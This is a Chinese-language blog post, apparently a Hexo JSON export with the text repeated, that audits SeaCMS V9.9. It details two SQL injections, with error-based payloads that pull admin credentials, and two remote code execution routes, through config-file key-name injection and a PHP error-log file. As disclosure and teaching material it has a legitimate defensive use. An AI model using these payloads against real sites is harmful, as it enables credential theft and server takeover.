使用addslashes进行过滤\n2. 使用str_replace对单引号等进行替换操作\n3. 使用is_numeric等方法对数字类型的输入进行判断与过滤\n\n \n\n审计此cms时发现，以上3种方式，在此程序的开发过程中，都有使用。但是，不严谨的使用，使得注入漏洞仍然存在\n\n首先分析下此cms，来看下\\include\\common.php文件\n![1.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170321-dfc7e1ba-b75f-1.png)\n\n如上图，在common.php文件中require filter.inc.php\n\n在filter.inc.php文件中，存在如下图代码\n![2.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170346-ee9f281a-b75f-1.png)\n此cms使用伪全局变量的模式，使用foreach从’_GET','_POST','_COOKIE’中遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值过滤后作为变量的值\n![3.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170415-001c2840-b760-1.png)\n跟进_FilterAll\n![4.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170426-06ac2c1e-b760-1.png)\n可见，程序在此处使用addslashes对键值进行过滤\n\n这样一来，我们可以通过’_GET','_POST','_COOKIE’为程序中的任意参数传入值，但是传入的值会被addslashes过滤\n\n例如 [http://www.testcms.com/index.php?grq=1'23](http://www.testcms.com/index.php?grq=1'23)\n\n程序接收此url后，程序中的grq变量会为：$grq=\"1\\'23\" \n\n开发者对这样的处理方式仍然不放心，于是，在\\include\\common.php文件中require_once(sea_INC.\"/filter.inc.php\")进行过滤后，再次从’_GET','_POST','_COOKIE’中取键值对进行伪全局变量赋值与过滤\n![5.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170441-0f62d70e-b760-1.png)\n跟进_RunMagicQuotes方法\n![6.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170525-29b4d468-b760-1.png)\n_RunMagicQuotes方法中对键值使用addslashes进行过滤与赋值变量\n\n以上两段代码依次执行，对比下这两处代码\n![7.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170534-2eca8812-b760-1.png)filter.inc.php文件中的过滤与赋值代码\n\n![8.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170542-33c69ac2-b760-1.png)common.php文件中的过滤与赋值代码\n\nfilter.inc.php文件中赋值的${$k}被后续common.php文件中的${$k}覆盖了，filter.inc.php文件中的过滤部分代码**白写了**。\n\n虽说filter.inc.php过滤部分代码在做无用功，但是仍然可以看出开发者对特殊字符的防范意识很高\n\n在了解完该程序之后，接下来漏洞：\n\n### 1．未对拼接参数使用单引号闭合而导致的sql注入漏洞\n![9.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170625-4d79ba62-b760-1.png)\n位于上图143行处\n\n经过上文对程序伪全局变量赋值方式的分析可知，这里$leftSelect 可由GET方法传递的来。当使用GET传入$leftSelect时，程序会使用addslashes对参数进行过滤\n\n但是如上图143行拼接的sql语句来看，并未对$leftSelect变量使用单引号进行闭合，导致虽然使用addslashes函数进行过滤，但仍然存在sql注入漏洞\n构造payload\n&leftSelect=1 or updatexml(1,concat(0x7,user(),0x7e),1)\n\n最终执行的sql语句是：\n\nUPDATE `sea_data` SET `tid`= 1 where tid= 1 or updatexml(1,concat(0x7,user(),0x7e),1)\n\n \n\n同样，在另一处文件中admin_tempvideo.php， 也存在相同的漏洞\n![10.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170635-53229dee-b760-1.png)\n![11.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170643-57fc4932-b760-1.png)\n如上图可见，$ids变量被拼接到sql语句中，并在上图25行被执行\n\n$ids变量由$e_id通过implode方法拼接而来，而$e_id变量可以通过GET方法直接传入，$e_id变量可控，由此造成sql注入漏洞\n\n构造的payload如下\n\n[&e_id[0\\]=1)%20or%20extractvalue(1,concat(0x7e,(SELECT%20CONCAT_WS(0x23,name,%20password)%20FROM%20sea_admin%20limit%200,1)))--%20&type=1](http://127.0.0.1/seacms/sh8vu7/admin_tempvideo.php?action=import&e_id[0]=1) or extractvalue(1,concat(0x7e,(SELECT CONCAT_WS(0x23,name, password) FROM sea_admin limit 0,1)))-- &type=1)\n\n \n\n### 2．对键值进行过滤，忘记对键名进行处理\n\n漏洞文件： admin_config.php\n![12.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170707-664ae516-b760-1.png)\n如上图，看到将$configstr变量写入文件中去\n\n查看下写入文件的具体位置\n![13.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170714-6ad85550-b760-1.png)\n该位置固定，即为[/data/config.cache.inc.php](http://127.0.0.1/seacms/data/config.cache.inc.php)\n![14.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170722-6f5544ee-b760-1.png)\nconfig.cache.inc.php\n\n \n\n跟踪下$configstr变量\n![15.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170732-759332f8-b760-1.png)\n$configstr变量由$k与$v拼接而来，\n\n在下图红框中所示，$$k的值经过str_replace方法过滤\n![16.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170740-79f1ceea-b760-1.png)\n在程序入口处，通过伪全局变量的方式，其实已经对$_POST中的$k进行变量赋值，所以$$k的值即为通过POST传入的变量的经过过滤的键值\n\n例如POST中\n\n&edit___grq=te’st\n\n那么，此时的$k=“&edit___grq”，$&edit___grq=”te\\’st”,$$k=” te\\’st”\n\n \n\n值得注意的是，上图中仅仅对$$k 进行str_replace处理，而$k并没有经过任何过滤，直接拼接到$configstr变量中，也就是说，可以通过POST提交的KEY值传递构造好的payload，该payload将会被写入文件中去，造成远程代码执行\n\n回头看一下config.cache.inc.php文件\n![17.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170748-7efd7696-b760-1.png)\n开发者在写过滤代码时，考虑到程序在处理配置文件经常会出现漏洞:即配置文件中变量值注入的问题\n\n在以往的此类漏洞中，往往是未对配置文件中变量值进行合理的过滤，导致单引号等特殊字符被写入值部分，从而构造闭合结果导致注入的产生。\n\n所以，开发者吸取了以往的经验，对写入配置文件中的值部分进行str_replace处理，对”’”与”\\”进行转义。但是，由于这里的变量名同样可控，而且未对变量名进行任何过滤，因此，str_replace处理形同虚设\n\n \n\n使用如下payload，直接注入\n\n&edit___a;phpinfo();//=1\n![18.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170757-840d8928-b760-1.png)\n### 3．经过严格的过滤，报错日志文件中却存在利用点 \n\n漏洞触发点位于\\comment\\api\\index.php\n![19.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170805-894f01be-b760-1.png)\n由于seacms采用伪全局变量的形式，$page $id等变量可以从GET请求参数中传递进来\n\n程序使用is_numeric对$page进行限制，使得$page必须是数字\n\n上图最下面一行，$h = ReadData($id,$page);\n\n可见将GET请求传入的$id,$page 传递进ReadDate方法中\n\n跟入ReadDate方法\n![20.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170817-90605778-b760-1.png)\n可见GET请求传入的$id,$page 传递进Readmlist方法中\n\n跟进Readmlist方法\n![21.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170825-94daf88a-b760-1.png)\n在Readmlist方法中的88行，可见存在一处sql语句\n![22.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170832-9933cb32-b760-1.png)\n可以看到，该sql语句中拼接了$page变量，而$page变量是由GET请求接收而来，可控\n\n当我们通过GET请求传递一个负数值的page时(例如-1)，此时执行的sql语句为\nSELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=1 AND v_id=666 ORDER BY id DESC limit -20,10\n\n该sql语句会导致sql语法错误而报错，如下图\n![23.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170841-9e3bb7ac-b760-1.png)\n到此为止，程序仍然是安全的，并不存在sql注入或是代码执行漏洞。但是此cms对报错日志的处理方式，却很有意思：\n\n \n\n当sql语法出现错误时，程序会将报错日志会被写入\\data\\mysqli_error_trace.php\n![24.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170851-a44a23d6-b760-1.png)\n跟进mysqli_error_trace.php文件，错误日志的格式如上图：\n\n错误日志会被<?php ?>包裹\n\n第一行（第一个红框）为触发错误的url\n\n第二行（第二个红框）为sql语法错误信息\n\n \n\n因此，当构造payload如下时\n\ncomment/api/index.php?page=-1&gid=666&payload=*/phpinfo();/*\n\n \n\n执行成功后，可见成功写入mysqli_error_trace.php，如下图：\n![25.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170900-a999b338-b760-1.png)\n访问[/data/mysqli_error_trace.php](http://127.0.0.1/seacms/data/mysqli_error_trace.php)\n\n即可执行phpinfo\n\n \n\n## 结束语\n\n从本次代码审计的结果来看，程序在使用addslashes等过滤方式对输入进行过滤后，仍然产生了两处代码执行，两处sql注入。因此使用addslashes等过滤方式在程序入口处对输入进行过滤并不能代表程序固若金汤。配合程序自身的逻辑，使用恰当的方式进行参数过滤才是最优解。","slug":"cmsV9-9","published":1,"updated":"2020-10-27T09:27:09.540Z","_id":"ckgrozu94002owsa955qz7swm","comments":1,"layout":"post","photos":[],"link":"","content":"<p>近日，对某cmsV9.9版本进行代码审计，发现了4处漏洞。</p>\n<p>这4处漏洞漏洞比较基础，也很经典。从这4处漏洞，可以反应了在程序开发过程中一些容易忽略的问题，下面分享下本次审计过程。</p>\n<a id=\"more\"></a>\n\n\n\n<h2 id=\"审计之旅\"><a href=\"#审计之旅\" class=\"headerlink\" title=\"审计之旅\"></a>审计之旅</h2><p>在开发程序时，如果没有正确的过滤单引号（’）、双引号（”）、反斜杠（\\）等特殊字符，往往会产生代码/sql注入漏洞。</p>\n<p>在针对这些特殊字符，开发者经常使用如下方式进行过滤：</p>\n<ol>\n<li>使用addslashes进行过滤</li>\n<li>使用str_replace对单引号等进行替换操作</li>\n<li>使用is_numeric等方法对数字类型的输入进行判断与过滤</li>\n</ol>\n<p>审计此cms时发现，以上3种方式，在此程序的开发过程中，都有使用。但是，不严谨的使用，使得注入漏洞仍然存在</p>\n<p>首先分析下此cms，来看下\\include\\common.php文件<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170321-dfc7e1ba-b75f-1.png\" alt=\"1.png\"></p>\n<p>如上图，在common.php文件中require filter.inc.php</p>\n<p>在filter.inc.php文件中，存在如下图代码<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170346-ee9f281a-b75f-1.png\" alt=\"2.png\"><br>此cms使用伪全局变量的模式，使用foreach从’_GET’,’_POST’,’_COOKIE’中遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值过滤后作为变量的值<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170415-001c2840-b760-1.png\" alt=\"3.png\"><br>跟进_FilterAll<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170426-06ac2c1e-b760-1.png\" alt=\"4.png\"><br>可见，程序在此处使用addslashes对键值进行过滤</p>\n<p>这样一来，我们可以通过’_GET’,’_POST’,’_COOKIE’为程序中的任意参数传入值，但是传入的值会被addslashes过滤</p>\n<p>例如 <a href=\"http://www.testcms.com/index.php?grq=1%2723\">http://www.testcms.com/index.php?grq=1’23</a></p>\n<p>程序接收此url后，程序中的grq变量会为：$grq=”1&#39;23” </p>\n<p>开发者对这样的处理方式仍然不放心，于是，在\\include\\common.php文件中require_once(sea_INC.”/filter.inc.php”)进行过滤后，再次从’_GET’,’_POST’,’_COOKIE’中取键值对进行伪全局变量赋值与过滤<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170441-0f62d70e-b760-1.png\" alt=\"5.png\"><br>跟进_RunMagicQuotes方法<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170525-29b4d468-b760-1.png\" alt=\"6.png\"><br>_RunMagicQuotes方法中对键值使用addslashes进行过滤与赋值变量</p>\n<p>以上两段代码依次执行，对比下这两处代码<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170534-2eca8812-b760-1.png\" alt=\"7.png\">filter.inc.php文件中的过滤与赋值代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170542-33c69ac2-b760-1.png\" alt=\"8.png\">common.php文件中的过滤与赋值代码</p>\n<p>filter.inc.php文件中赋值的${$k}被后续common.php文件中的${$k}覆盖了，filter.inc.php文件中的过滤部分代码<strong>白写了</strong>。</p>\n<p>虽说filter.inc.php过滤部分代码在做无用功，但是仍然可以看出开发者对特殊字符的防范意识很高</p>\n<p>在了解完该程序之后，接下来漏洞：</p>\n<h3 id=\"1．未对拼接参数使用单引号闭合而导致的sql注入漏洞\"><a href=\"#1．未对拼接参数使用单引号闭合而导致的sql注入漏洞\" class=\"headerlink\" title=\"1．未对拼接参数使用单引号闭合而导致的sql注入漏洞\"></a>1．未对拼接参数使用单引号闭合而导致的sql注入漏洞</h3><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170625-4d79ba62-b760-1.png\" alt=\"9.png\"><br>位于上图143行处</p>\n<p>经过上文对程序伪全局变量赋值方式的分析可知，这里$leftSelect 可由GET方法传递的来。当使用GET传入$leftSelect时，程序会使用addslashes对参数进行过滤</p>\n<p>但是如上图143行拼接的sql语句来看，并未对$leftSelect变量使用单引号进行闭合，导致虽然使用addslashes函数进行过滤，但仍然存在sql注入漏洞<br>构造payload<br>&amp;leftSelect=1 or updatexml(1,concat(0x7,user(),0x7e),1)</p>\n<p>最终执行的sql语句是：</p>\n<p>UPDATE <code>sea_data</code> SET <code>tid</code>= 1 where tid= 1 or updatexml(1,concat(0x7,user(),0x7e),1)</p>\n<p>同样，在另一处文件中admin_tempvideo.php， 也存在相同的漏洞<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170635-53229dee-b760-1.png\" alt=\"10.png\"><br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170643-57fc4932-b760-1.png\" alt=\"11.png\"><br>如上图可见，$ids变量被拼接到sql语句中，并在上图25行被执行</p>\n<p>$ids变量由$e_id通过implode方法拼接而来，而$e_id变量可以通过GET方法直接传入，$e_id变量可控，由此造成sql注入漏洞</p>\n<p>构造的payload如下</p>\n<p>[&amp;e_id<a href=\"http://127.0.0.1/seacms/sh8vu7/admin_tempvideo.php?action=import&e_id%5B0%5D=1\">0]=1)%20or%20extractvalue(1,concat(0x7e,(SELECT%20CONCAT_WS(0x23,name,%20password)%20FROM%20sea_admin%20limit%200,1)))–%20&amp;type=1</a> or extractvalue(1,concat(0x7e,(SELECT CONCAT_WS(0x23,name, password) FROM sea_admin limit 0,1)))– &amp;type=1)</p>\n<h3 id=\"2．对键值进行过滤，忘记对键名进行处理\"><a href=\"#2．对键值进行过滤，忘记对键名进行处理\" class=\"headerlink\" title=\"2．对键值进行过滤，忘记对键名进行处理\"></a>2．对键值进行过滤，忘记对键名进行处理</h3><p>漏洞文件： admin_config.php<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170707-664ae516-b760-1.png\" alt=\"12.png\"><br>如上图，看到将$configstr变量写入文件中去</p>\n<p>查看下写入文件的具体位置<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170714-6ad85550-b760-1.png\" alt=\"13.png\"><br>该位置固定，即为<a href=\"http://127.0.0.1/seacms/data/config.cache.inc.php\">/data/config.cache.inc.php</a><br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170722-6f5544ee-b760-1.png\" alt=\"14.png\"><br>config.cache.inc.php</p>\n<p>跟踪下$configstr变量<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170732-759332f8-b760-1.png\" alt=\"15.png\"><br>$configstr变量由$k与$v拼接而来，</p>\n<p>在下图红框中所示，$$k的值经过str_replace方法过滤<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170740-79f1ceea-b760-1.png\" alt=\"16.png\"><br>在程序入口处，通过伪全局变量的方式，其实已经对$_POST中的$k进行变量赋值，所以$$k的值即为通过POST传入的变量的经过过滤的键值</p>\n<p>例如POST中</p>\n<p>&amp;edit___grq=te’st</p>\n<p>那么，此时的$k=“&amp;edit___grq”，$&amp;edit___grq=”te\\’st”,$$k=” te\\’st”</p>\n<p>值得注意的是，上图中仅仅对$$k 进行str_replace处理，而$k并没有经过任何过滤，直接拼接到$configstr变量中，也就是说，可以通过POST提交的KEY值传递构造好的payload，该payload将会被写入文件中去，造成远程代码执行</p>\n<p>回头看一下config.cache.inc.php文件<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170748-7efd7696-b760-1.png\" alt=\"17.png\"><br>开发者在写过滤代码时，考虑到程序在处理配置文件经常会出现漏洞:即配置文件中变量值注入的问题</p>\n<p>在以往的此类漏洞中，往往是未对配置文件中变量值进行合理的过滤，导致单引号等特殊字符被写入值部分，从而构造闭合结果导致注入的产生。</p>\n<p>所以，开发者吸取了以往的经验，对写入配置文件中的值部分进行str_replace处理，对”’”与”\\”进行转义。但是，由于这里的变量名同样可控，而且未对变量名进行任何过滤，因此，str_replace处理形同虚设</p>\n<p>使用如下payload，直接注入</p>\n<p>&edit___a;phpinfo();//=1<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170757-840d8928-b760-1.png\" alt=\"18.png\"></p>\n<h3 id=\"3．经过严格的过滤，报错日志文件中却存在利用点\"><a href=\"#3．经过严格的过滤，报错日志文件中却存在利用点\" class=\"headerlink\" title=\"3．经过严格的过滤，报错日志文件中却存在利用点\"></a>3．经过严格的过滤，报错日志文件中却存在利用点</h3><p>漏洞触发点位于\\comment\\api\\index.php<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170805-894f01be-b760-1.png\" alt=\"19.png\"><br>由于seacms采用伪全局变量的形式，$page $id等变量可以从GET请求参数中传递进来</p>\n<p>程序使用is_numeric对$page进行限制，使得$page必须是数字</p>\n<p>上图最下面一行，$h = ReadData($id,$page);</p>\n<p>可见将GET请求传入的$id,$page 传递进ReadDate方法中</p>\n<p>跟入ReadDate方法<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170817-90605778-b760-1.png\" alt=\"20.png\"><br>可见GET请求传入的$id,$page 传递进Readmlist方法中</p>\n<p>跟进Readmlist方法<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170825-94daf88a-b760-1.png\" alt=\"21.png\"><br>在Readmlist方法中的88行，可见存在一处sql语句<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170832-9933cb32-b760-1.png\" alt=\"22.png\"><br>可以看到，该sql语句中拼接了$page变量，而$page变量是由GET请求接收而来，可控</p>\n<p>当我们通过GET请求传递一个负数值的page时(例如-1)，此时执行的sql语句为<br>SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=1 AND v_id=666 ORDER BY id DESC limit -20,10</p>\n<p>该sql语句会导致sql语法错误而报错，如下图<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170841-9e3bb7ac-b760-1.png\" alt=\"23.png\"><br>到此为止，程序仍然是安全的，并不存在sql注入或是代码执行漏洞。但是此cms对报错日志的处理方式，却很有意思：</p>\n<p>当sql语法出现错误时，程序会将报错日志会被写入\\data\\mysqli_error_trace.php<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170851-a44a23d6-b760-1.png\" alt=\"24.png\"><br>跟进mysqli_error_trace.php文件，错误日志的格式如上图：</p>\n<p>错误日志会被<?php ?>包裹</p>\n<p>第一行（第一个红框）为触发错误的url</p>\n<p>第二行（第二个红框）为sql语法错误信息</p>\n<p>因此，当构造payload如下时</p>\n<p>comment/api/index.php?page=-1&amp;gid=666&amp;payload=<em>/phpinfo();/</em></p>\n<p>执行成功后，可见成功写入mysqli_error_trace.php，如下图：<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170900-a999b338-b760-1.png\" alt=\"25.png\"><br>访问<a href=\"http://127.0.0.1/seacms/data/mysqli_error_trace.php\">/data/mysqli_error_trace.php</a></p>\n<p>即可执行phpinfo</p>\n<h2 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h2><p>从本次代码审计的结果来看，程序在使用addslashes等过滤方式对输入进行过滤后，仍然产生了两处代码执行，两处sql注入。因此使用addslashes等过滤方式在程序入口处对输入进行过滤并不能代表程序固若金汤。配合程序自身的逻辑，使用恰当的方式进行参数过滤才是最优解。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/网络安全威胁月报.jpg","excerpt":"<p>近日，对某cmsV9.9版本进行代码审计，发现了4处漏洞。</p>\n<p>这4处漏洞漏洞比较基础，也很经典。从这4处漏洞，可以反应了在程序开发过程中一些容易忽略的问题，下面分享下本次审计过程。</p>","more":"<h2 id=\"审计之旅\"><a href=\"#审计之旅\" class=\"headerlink\" title=\"审计之旅\"></a>审计之旅</h2><p>在开发程序时，如果没有正确的过滤单引号（’）、双引号（”）、反斜杠（\\）等特殊字符，往往会产生代码/sql注入漏洞。</p>\n<p>在针对这些特殊字符，开发者经常使用如下方式进行过滤：</p>\n<ol>\n<li>使用addslashes进行过滤</li>\n<li>使用str_replace对单引号等进行替换操作</li>\n<li>使用is_numeric等方法对数字类型的输入进行判断与过滤</li>\n</ol>\n<p>审计此cms时发现，以上3种方式，在此程序的开发过程中，都有使用。但是，不严谨的使用，使得注入漏洞仍然存在</p>\n<p>首先分析下此cms，来看下\\include\\common.php文件<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170321-dfc7e1ba-b75f-1.png\" alt=\"1.png\"></p>\n<p>如上图，在common.php文件中require filter.inc.php</p>\n<p>在filter.inc.php文件中，存在如下图代码<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170346-ee9f281a-b75f-1.png\" alt=\"2.png\"><br>此cms使用伪全局变量的模式，使用foreach从’_GET’,’_POST’,’_COOKIE’中遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值过滤后作为变量的值<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170415-001c2840-b760-1.png\" alt=\"3.png\"><br>跟进_FilterAll<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170426-06ac2c1e-b760-1.png\" alt=\"4.png\"><br>可见，程序在此处使用addslashes对键值进行过滤</p>\n<p>这样一来，我们可以通过’_GET’,’_POST’,’_COOKIE’为程序中的任意参数传入值，但是传入的值会被addslashes过滤</p>\n<p>例如 <a href=\"http://www.testcms.com/index.php?grq=1%2723\">http://www.testcms.com/index.php?grq=1’23</a></p>\n<p>程序接收此url后，程序中的grq变量会为：$grq=”1&#39;23” </p>\n<p>开发者对这样的处理方式仍然不放心，于是，在\\include\\common.php文件中require_once(sea_INC.”/filter.inc.php”)进行过滤后，再次从’_GET’,’_POST’,’_COOKIE’中取键值对进行伪全局变量赋值与过滤<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170441-0f62d70e-b760-1.png\" alt=\"5.png\"><br>跟进_RunMagicQuotes方法<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170525-29b4d468-b760-1.png\" alt=\"6.png\"><br>_RunMagicQuotes方法中对键值使用addslashes进行过滤与赋值变量</p>\n<p>以上两段代码依次执行，对比下这两处代码<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170534-2eca8812-b760-1.png\" alt=\"7.png\">filter.inc.php文件中的过滤与赋值代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170542-33c69ac2-b760-1.png\" alt=\"8.png\">common.php文件中的过滤与赋值代码</p>\n<p>filter.inc.php文件中赋值的${$k}被后续common.php文件中的${$k}覆盖了，filter.inc.php文件中的过滤部分代码<strong>白写了</strong>。</p>\n<p>虽说filter.inc.php过滤部分代码在做无用功，但是仍然可以看出开发者对特殊字符的防范意识很高</p>\n<p>在了解完该程序之后，接下来漏洞：</p>\n<h3 id=\"1．未对拼接参数使用单引号闭合而导致的sql注入漏洞\"><a href=\"#1．未对拼接参数使用单引号闭合而导致的sql注入漏洞\" class=\"headerlink\" title=\"1．未对拼接参数使用单引号闭合而导致的sql注入漏洞\"></a>1．未对拼接参数使用单引号闭合而导致的sql注入漏洞</h3><p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170625-4d79ba62-b760-1.png\" alt=\"9.png\"><br>位于上图143行处</p>\n<p>经过上文对程序伪全局变量赋值方式的分析可知，这里$leftSelect 可由GET方法传递的来。当使用GET传入$leftSelect时，程序会使用addslashes对参数进行过滤</p>\n<p>但是如上图143行拼接的sql语句来看，并未对$leftSelect变量使用单引号进行闭合，导致虽然使用addslashes函数进行过滤，但仍然存在sql注入漏洞<br>构造payload<br>&amp;leftSelect=1 or updatexml(1,concat(0x7,user(),0x7e),1)</p>\n<p>最终执行的sql语句是：</p>\n<p>UPDATE <code>sea_data</code> SET <code>tid</code>= 1 where tid= 1 or updatexml(1,concat(0x7,user(),0x7e),1)</p>\n<p>同样，在另一处文件中admin_tempvideo.php， 也存在相同的漏洞<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170635-53229dee-b760-1.png\" alt=\"10.png\"><br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170643-57fc4932-b760-1.png\" alt=\"11.png\"><br>如上图可见，$ids变量被拼接到sql语句中，并在上图25行被执行</p>\n<p>$ids变量由$e_id通过implode方法拼接而来，而$e_id变量可以通过GET方法直接传入，$e_id变量可控，由此造成sql注入漏洞</p>\n<p>构造的payload如下</p>\n<p>[&amp;e_id<a href=\"http://127.0.0.1/seacms/sh8vu7/admin_tempvideo.php?action=import&e_id%5B0%5D=1\">0]=1)%20or%20extractvalue(1,concat(0x7e,(SELECT%20CONCAT_WS(0x23,name,%20password)%20FROM%20sea_admin%20limit%200,1)))–%20&amp;type=1</a> or extractvalue(1,concat(0x7e,(SELECT CONCAT_WS(0x23,name, password) FROM sea_admin limit 0,1)))– &amp;type=1)</p>\n<h3 id=\"2．对键值进行过滤，忘记对键名进行处理\"><a href=\"#2．对键值进行过滤，忘记对键名进行处理\" class=\"headerlink\" title=\"2．对键值进行过滤，忘记对键名进行处理\"></a>2．对键值进行过滤，忘记对键名进行处理</h3><p>漏洞文件： admin_config.php<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170707-664ae516-b760-1.png\" alt=\"12.png\"><br>如上图，看到将$configstr变量写入文件中去</p>\n<p>查看下写入文件的具体位置<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170714-6ad85550-b760-1.png\" alt=\"13.png\"><br>该位置固定，即为<a href=\"http://127.0.0.1/seacms/data/config.cache.inc.php\">/data/config.cache.inc.php</a><br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170722-6f5544ee-b760-1.png\" alt=\"14.png\"><br>config.cache.inc.php</p>\n<p>跟踪下$configstr变量<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170732-759332f8-b760-1.png\" alt=\"15.png\"><br>$configstr变量由$k与$v拼接而来，</p>\n<p>在下图红框中所示，$$k的值经过str_replace方法过滤<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170740-79f1ceea-b760-1.png\" alt=\"16.png\"><br>在程序入口处，通过伪全局变量的方式，其实已经对$_POST中的$k进行变量赋值，所以$$k的值即为通过POST传入的变量的经过过滤的键值</p>\n<p>例如POST中</p>\n<p>&amp;edit___grq=te’st</p>\n<p>那么，此时的$k=“&amp;edit___grq”，$&amp;edit___grq=”te\\’st”,$$k=” te\\’st”</p>\n<p>值得注意的是，上图中仅仅对$$k 